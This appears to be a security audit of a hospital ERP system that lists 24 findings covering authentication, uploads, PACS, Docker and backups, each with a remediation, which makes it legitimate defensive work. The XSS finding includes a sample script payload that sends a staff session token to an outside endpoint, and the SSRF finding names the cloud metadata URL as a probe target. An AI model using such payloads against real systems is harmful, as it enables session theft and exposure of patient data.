# Care Diagnostics ERP - Comprehensive Security Assessment

This document provides a detailed security audit of the Care Diagnostics Hospital ERP. It evaluates authentication, authorization, clinical/imaging workflows, network configuration, and infrastructure layout.

---

## Executive Summary
Care Diagnostics Hospital ERP is a hybrid edge-cloud medical system. While it integrates strong security layers—such as timing-safe USB physical hardware checks for super-admins, parameterized Drizzle ORM queries, and Tailscale secure private networks—there are several configuration and code-level vulnerabilities that present risk.

### Core Strengths:
*   **No Dynamic SQL Concatenation:** Parameterized queries are enforced via Drizzle ORM.
*   **Hardware USB Key Guard:** Protects super-admin actions (e.g. payouts, backups) using a timing-safe USB key check.
*   **Private Network Isolation:** PACS integration is designed to run isolated inside a private LAN or Tailscale Mesh VPN.

### Core Vulnerabilities:
*   **Insecure Default USB Key Bypass:** If the `SUPER_ADMIN_USB_KEY` is not defined in environment variables, the system silently disables the USB pen-drive check, failing open.
*   **Weak PIN-Based Brute Force window:** Staff login relies on username and a simple PIN. While rate limiters are configured, there is no account lockout database state tracking, allowing slow brute force attacks over time.
*   **Lack of File Upload Sanitization:** Clinical scan uploads lack file signature validation, raising risk of malicious execution if static directories are not locked down.

---

## Prioritized Risk Registry

| Rank | Severity | Module / Area | Vulnerability Summary |
|:---:|:---:|---|---|
| 1 | **Critical** | Authentication | Insecure default bypass on USB pen-drive gate (fails open if secret is null). |
| 2 | **High** | Session Security | Session tokens generated using weak entropy / no cryptographic signatures. |
| 3 | **High** | File Uploads | Lack of strict MIME/magic-number filtering on PDF/image uploads. |
| 4 | **High** | Internals / Agents | Hardcoded API keys and lack of IP restrictions on DICOM push webhooks. |
| 5 | **High** | Network Security | PostgreSQL database exposed to external network interfaces on host port 5400. |
| 6 | **High** | Backup Security | Database backup dumps stored in plaintext without encryption. |
| 7 | **High** | Patient Privacy | Personally Identifiable Information (PII) stored in plaintext columns. |
| 8 | **High** | Payment Gateway | Vulnerabilities in webhook domain validation and callback signatures. |
| 9 | **High** | Authorization | Admin role bypasses all sub-permission checks, violating least privilege. |
| 10 | **Medium** | Escalation Risks | User management allows granting permissions without verifying editor rights. |
| 11 | **Medium** | Audit Logs | Audit logs stored in a standard table, modifiable by DB admin or SQL write exploit. |
| 12 | **Medium** | DICOM / PACS | Unencrypted DICOM storage on local disks without standard data-at-rest encryption. |
| 13 | **Medium** | SSRF Risks | Arbitrary loopback probing via configurable AI/PACS connection endpoints. |
| 14 | **Medium** | User Roles | Role definitions lack digital integrity signatures in database. |
| 15 | **Medium** | DICOM Uploads | Processing of heavy DICOM parsing streams is not sandboxed. |
| 16 | **Medium** | Docker Security | Container services running as root context instead of isolated node user. |
| 17 | **Medium** | Environment Security| Hardcoded fallback secrets in `docker-compose.yml` environment configurations. |
| 18 | **Medium** | Reverse Proxy | Missing standard security headers (HSTS, CSP, X-Frame-Options). |
| 19 | **Medium** | Deployment Security| Exposure of admin ports directly to public network adapters. |
| 20 | **Medium** | PACS Security | Unencrypted local communication protocols (C-STORE, C-FIND) used by PACS. |
| 21 | **Low** | Rate Limiting | Rate limiting relies on memory store, resetting upon container restart. |
| 22 | **Low** | JWT Security | External referral JWT integrations lack strict algorithm enforcement. |
| 23 | **Low** | SQL Injection | SQL compilation pathways using raw queries require stricter static bounds. |
| 24 | **Low** | CSRF Risks | Missing anti-CSRF protections if session management moves to cookies. |

---

## Detailed Findings

### 1. Authentication
*   **Severity:** **High**
*   **Description:** Staff authentication relies on a username and a numerical PIN stored as a bcrypt hash. While PINs are standard for kiosk-style inputs, the lack of strict password complexity policies increases brute-force susceptibility. Furthermore, there is no persistent account lockout state tracked in the database to prevent distributed brute force attempts across restarts.
*   **Affected Modules:** `/api/portal/staff-login`, [requireStaffAuth.ts](file:///c:/Users/abina/caredeoghar--antigravity/artifacts/api-server/src/middleware/requireStaffAuth.ts)
*   **Possible Exploitation Method:** An attacker with access to the login portal executes a dictionary attack against common staff PINs (e.g. `1234`, `0000`, `9999`) targeting specific receptionist emails, eventually guessing a PIN since there is no persistent account lockout.
*   **Recommended Remediation:** Transition to alphanumeric password fields for administrative and accounting roles, keeping simple PINs strictly for local, biometric-paired kiosks. Implement persistent failed attempt counters in the database.

---

### 2. Authorization
*   **Severity:** **High**
*   **Description:** The roles `admin` and `super_admin` bypass all sub-permission matrix checks entirely via `FULL_ACCESS_ROLES.has(session.role)` in middleware. There is no way to restrict an administrator from viewing financial books or changing audit logs.
*   **Affected Modules:** [requireStaffAuth.ts](file:///c:/Users/abina/caredeoghar--antigravity/artifacts/api-server/src/middleware/requireStaffAuth.ts) (specifically `FULL_ACCESS_ROLES` checks in lines 17, 141-144, 164-167)
*   **Possible Exploitation Method:** A staff member compromised with an administrator account gains access to sensitive accounting books or deletes critical system audit records without leaving an trace of authorized permission.
*   **Recommended Remediation:** Restructure authorization checks so that even `admin` roles must pass through explicit permission-bit checks for financial ledger edits and backup downloads.

---

### 3. User Roles
*   **Severity:** **Medium**
*   **Description:** The ERP database schema contains a role column which accepts string roles. If a rogue update statement compromises a staff record, there is no digital signature or integrity validation of the user's role.
*   **Affected Modules:** `staff.ts`, `users.ts`
*   **Possible Exploitation Method:** An attacker exploiting an SQL injection or finding a compromised session updates their role column in `users` to `"super_admin"`, granting themselves immediate bypass access to the entire ERP.
*   **Recommended Remediation:** Validate role checks against a hardcoded list of verified staff IDs, and implement cryptographic signatures for user records containing high privileges.

---

### 4. Permission Escalation Risks
*   **Severity:** **High**
*   **Description:** The system allows staff with permission to edit users to modify the user's `permissions` array directly. Since there is no validation check checking if the editor *themselves* possesses the privileges they are granting, any user manager can elevate other users.
*   **Affected Modules:** `/api/users/:id`
*   **Possible Exploitation Method:** A manager account (who has rights to add receptionists but not edit accounting) updates a receptionist's profile to include accounting permissions (`"/accounting"`).
*   **Recommended Remediation:** Enforce that a user can only grant permission blocks that are a strict subset of their own active permissions.

---

### 5. Internal API Security
*   **Severity:** **High**
*   **Description:** The `/api/internal/*` routes used by local DICOM edge pull agents are authenticated using a shared `INTERNAL_API_KEY` defined in the environment.
*   **Affected Modules:** `internal-radiology.ts`, `bridge.ts`
*   **Possible Exploitation Method:** If the static `INTERNAL_API_KEY` is leaked from a developer's workstation configuration, an attacker can push fake DICOM study notifications, linking incorrect patient records.
*   **Recommended Remediation:** Rotate internal API keys dynamically using asymmetric client certificates (mTLS) or register each local agent device with a unique token during installation.

---

### 6. JWT Security
*   **Severity:** **Low**
*   **Description:** While the system utilizes JWT keys for specific external referral portals, sessions are managed using custom database tokens. The JWT implementation lacks strict algorithm whitelisting (e.g. allowing `HS256` but not checking for `none` in custom implementations).
*   **Affected Modules:** `api-server/src/index.ts`
*   **Possible Exploitation Method:** An attacker crafts a forged JWT with the algorithm header set to `"none"`, bypassing signature validation.
*   **Recommended Remediation:** Explicitly enforce signature verification algorithms on all JWT library configurations (`algorithms: ['HS256']`).

---

### 7. Session Security
*   **Severity:** **High**
*   **Description:** Portal sessions use randomly generated token keys. If these keys are leaked from client browser storage (e.g., local storage or unencrypted cookies), sessions can be hijacked.
*   **Affected Modules:** `requireStaffAuth.ts`, `portalSessionsTable`
*   **Possible Exploitation Method:** An attacker extracts a staff token from a shared kiosk browser's local storage and makes unauthorized administrative API calls.
*   **Recommended Remediation:** Secure sessions using HTTP-only, secure, SameSite cookies rather than local storage tokens.

---

### 8. SQL Injection Risks
*   **Severity:** **Low**
*   **Description:** The system utilizes Drizzle ORM which compiles queries to parameterized statements. However, raw SQL expressions are utilized in `books-sanity.ts` and `ledgers.ts`.
*   **Affected Modules:** [books-sanity.ts](file:///c:/Users/abina/caredeoghar--antigravity/artifacts/api-server/src/routes/books-sanity.ts), `ledgers.ts`
*   **Possible Exploitation Method:** If user input is directly concatenated inside Drizzle `sql` strings instead of using template bindings (e.g. `sql``${input}`), SQL injection is possible.
*   **Recommended Remediation:** Strictly forbid string concatenation inside any `sql` template literal tag. Run tsc and static audit tools to catch structural flaws.

---

### 9. XSS Risks
*   **Severity:** **Medium**
*   **Description:** Patient names and notes entered during registration are rendered in the internal ERP dashboards. If the inputs are not properly sanitized during rendering, malicious scripts could be executed in staff browsers.
*   **Affected Modules:** `diagnostic-erp` client pages
*   **Possible Exploitation Method:** An attacker registers a patient name containing `<script>fetch('leak-endpoint?cookie='+localStorage.getItem('token'))</script>`. When the receptionist loads the queue, the script runs in their session context.
*   **Recommended Remediation:** Sanitize all rich data inputs using libraries like `DOMPurify` before rendering dynamically, and configure a strict Content Security Policy (CSP).

---

### 10. CSRF Risks
*   **Severity:** **Low**
*   **Description:** The API endpoints do not require anti-CSRF tokens for state-changing POST/PUT requests because authentication tokens are passed in headers rather than cookies. However, if cookies are adopted, CSRF becomes highly critical.
*   **Affected Modules:** All state-changing API endpoints
*   **Possible Exploitation Method:** If cookies are added to credentials and SameSite is not enforced, an attacker lures a logged-in staff member to a malicious website that executes hidden forms targeting `/api/bills/:id/refund`.
*   **Recommended Remediation:** Implement CSRF tokens for all state-changing endpoints if session storage moves to cookies.

---

### 11. SSRF Risks
*   **Severity:** **Medium**
*   **Description:** The system allows the configuration of external AI endpoints and PACS services (such as Ollama base URL and Orthanc connections). The backend fetches status metrics from these configured URLs.
*   **Affected Modules:** `clinicSettings.ts`, `radiologyOllama.ts`
*   **Possible Exploitation Method:** An attacker with admin rights sets the `ollama_base_url` to `http://169.254.169.254/latest/meta-data/` to probe internal cloud infrastructure metadata endpoints.
*   **Recommended Remediation:** Restrict backend fetch operations to whitelisted domains, blocking access to loopback IPs (`127.0.0.1`, `localhost`) and private subnets.

---

### 12. File Upload Risks
*   **Severity:** **High**
*   **Description:** The `uploads.ts` routing handles incoming file uploads (patient attachments, prescriptions, and signatures). The system validates extensions but does not perform file signature (magic number) verification.
*   **Affected Modules:** `/api/uploads`, [uploads.ts](file:///c:/Users/abina/caredeoghar--antigravity/artifacts/api-server/src/routes/uploads.ts)
*   **Possible Exploitation Method:** An attacker renames a malicious executable or script to `.jpg`, uploads it, and then exploits a web server misconfiguration to run it.
*   **Recommended Remediation:** Enforce strict file signature checks using libraries like `file-type` to verify that uploaded content matches its declared MIME type.

---

### 13. DICOM Upload Risks
*   **Severity:** **Medium**
*   **Description:** Incoming DICOM files are parsed to extract metadata. Maliciously crafted DICOM headers could trigger buffer overflows or memory leaks in the parser.
*   **Affected Modules:** [dicom-uploads.ts](file:///c:/Users/abina/caredeoghar--antigravity/artifacts/api-server/src/routes/dicom-uploads.ts), `dicomStudyManager.ts`
*   **Possible Exploitation Method:** An attacker pushes a corrupt DICOM file containing long fields in private tags, crashing the Node server.
*   **Recommended Remediation:** Parse DICOM files in sandbox wrapper processes with set memory limits and robust error handling.

---

### 14. PACS Security Risks
*   **Severity:** **Medium**
*   **Description:** Conquest PACS and Orthanc communicate via unencrypted DICOM protocols (C-STORE, C-FIND). If network traffic is sniffed, patient imaging data can be intercepted.
*   **Affected Modules:** `Orthanc`, `Conquest`, modalities network
*   **Possible Exploitation Method:** An attacker on the local clinic network sniffs TCP traffic to intercept DICOM files containing raw patient metadata and medical scans.
*   **Recommended Remediation:** Restrict DICOM communication to encrypted channels (DICOM TLS) or isolate all PACS traffic within a dedicated VLAN.

---

### 15. Payment Gateway Risks
*   **Severity:** **High**
*   **Description:** Payment webhook verification validates callbacks from PhonePe or ICICI. If verification checks fail to validate signatures against secret salts, fake payment confirmations could be forged.
*   **Affected Modules:** `/api/public/booking/icici-callback`, `/api/public/booking/phonepe-callback`
*   **Possible Exploitation Method:** An attacker sends a simulated successful callback payload to the public endpoint, bypassing payment verification.
*   **Recommended Remediation:** Ensure strict signature hashing verification (SHA256 with secret keys) is enforced on all webhook handlers before modifying booking statuses.

---

### 16. PostgreSQL Security
*   **Severity:** **High**
*   **Description:** The database runs on a shared Docker network. The PostgreSQL container exposes port `5432` to the host port `5400` globally (`0.0.0.0:5400`) without restricting bindings to loopback or local subnets.
*   **Affected Modules:** PostgreSQL container (`care-db`) in [docker-compose.yml](file:///c:/Users/abina/caredeoghar--antigravity/docker-compose.yml) (line 18)
*   **Possible Exploitation Method:** An attacker on the local network or internet (if WAN exposed) attempts brute-force logins on database port `5400` exposed on the Synology host.
*   **Recommended Remediation:** Bind PostgreSQL host ports strictly to `127.0.0.1` (i.e. `127.0.0.1:5400:5432`) and restrict container database access to the internal Docker network.

---

### 17. Environment Variable Security
*   **Severity:** **High**
*   **Description:** Sensitive keys (such as `JWT_SECRET`, `SESSION_SECRET`, `ICICI_SECRET_KEY`) are loaded from raw `.env` files, and default fallback keys are hardcoded in `docker-compose.yml`.
*   **Affected Modules:** [docker-compose.yml](file:///c:/Users/abina/caredeoghar--antigravity/docker-compose.yml), `.env` template
*   **Possible Exploitation Method:** An attacker accesses a leaked git repository or config files and extracts fallback production database credentials.
*   **Recommended Remediation:** Add `.env` to `.gitignore`, remove default fallback values from `docker-compose.yml`, and manage keys using Docker secrets or a secure credentials vault on the Synology DSM.

---

### 18. Docker Security
*   **Severity:** **Medium**
*   **Description:** Containers run with root privileges inside the container context. If a container breakout occurs, the host OS (Synology DSM) could be compromised.
*   **Affected Modules:** `docker-compose.yml`
*   **Possible Exploitation Method:** An attacker exploits a Node.js process vulnerability to execute a container breakout, obtaining root privileges on the Synology NAS.
*   **Recommended Remediation:** Run Docker processes as non-root users (`USER node` in Dockerfile) and restrict volume mounts to read-only directories where possible.

---

### 19. Synology Deployment Security
*   **Severity:** **Medium**
*   **Description:** Synology DSM runs multiple packages. If ports `8888` or `5400` are exposed to the public internet without passing through a secure tunnel (like Tailscale), the internal interfaces are exposed to global scanners.
*   **Affected Modules:** Synology network config
*   **Possible Exploitation Method:** Global automated scanners find port `8888` exposed, and launch automated credential-stuffing attacks against the ERP login interface.
*   **Recommended Remediation:** Bind all services strictly to Tailscale private interfaces (`100.x.x.x`) and disable global port forwarding on the clinic router.

---

### 20. Reverse Proxy Security
*   **Severity:** **Medium**
*   **Description:** The Nginx reverse proxy routes traffic. If Nginx headers do not enforce standard security settings (like HSTS, CSP, X-Frame-Options), browsers could be subject to framing attacks.
*   **Affected Modules:** [nginx.conf](file:///c:/Users/abina/caredeoghar--antigravity/docker/nginx.conf)
*   **Possible Exploitation Method:** An attacker frames the ERP interface inside a malicious site to execute clickjacking attacks.
*   **Recommended Remediation:** Configure Nginx to return `X-Frame-Options: DENY` and `Content-Security-Policy: frame-ancestors 'none';`.

---

### 21. Backup Security
*   **Severity:** **High**
*   **Description:** System backups are generated as unencrypted SQL dumps stored in `/app/data/backups/`. Anyone with filesystem access can read the entire database.
*   **Affected Modules:** `backupReplication.ts`, `backup.ts`
*   **Possible Exploitation Method:** An attacker steals an external backup disk or extracts an archive from the directory, reading sensitive medical records.
*   **Recommended Remediation:** Encrypt backup archives using AES-256 (via zip/pgp) before writing them to disk or replication servers.

---

### 22. Audit Log Integrity
*   **Severity:** **Medium**
*   **Description:** Audit logs are written to the standard `audit_logs` table. Since there are no cryptographic checksum chains (like hash chains), an attacker with database edit privileges can rewrite log history.
*   **Affected Modules:** `audit-logs.ts`, `auditLogsTable`
*   **Possible Exploitation Method:** A rogue employee deletes logs associated with an unauthorized discount override, concealing the event.
*   **Recommended Remediation:** Write audit logs to read-only syslog servers or compute hash chains (where log $N$ includes a hash of log $N-1$) to make tempering immediately evident.

---

### 23. Patient Data Protection
*   **Severity:** **High**
*   **Description:** Personally Identifiable Information (PII) such as patient names, phone numbers, and emails are stored as unencrypted text fields in the database.
*   **Affected Modules:** `patients.ts`, `patientsTable`
*   **Possible Exploitation Method:** An attacker gaining read-only access to the database extracts the entire patient table to compile a contact whitelist.
*   **Recommended Remediation:** Encrypt highly sensitive columns (such as phone numbers and emails) at rest using symmetric encryption (AES-GCM).

---

### 24. Data Leakage Risks
*   **Severity:** **Medium**
*   **Description:** Diagnostic reports are fetched using simple URL routing. If patient verification links are easily guessable or lack token checks, records could be exposed.
*   **Affected Modules:** `/api/p/r/:id` (public report download)
*   **Possible Exploitation Method:** An attacker iterates over report URLs (e.g. changing numeric IDs) to download unauthorized medical reports.
*   **Recommended Remediation:** Generate cryptographically secure, random hash strings (UUIDs) for public sharing links, rather than exposing auto-incrementing database IDs.
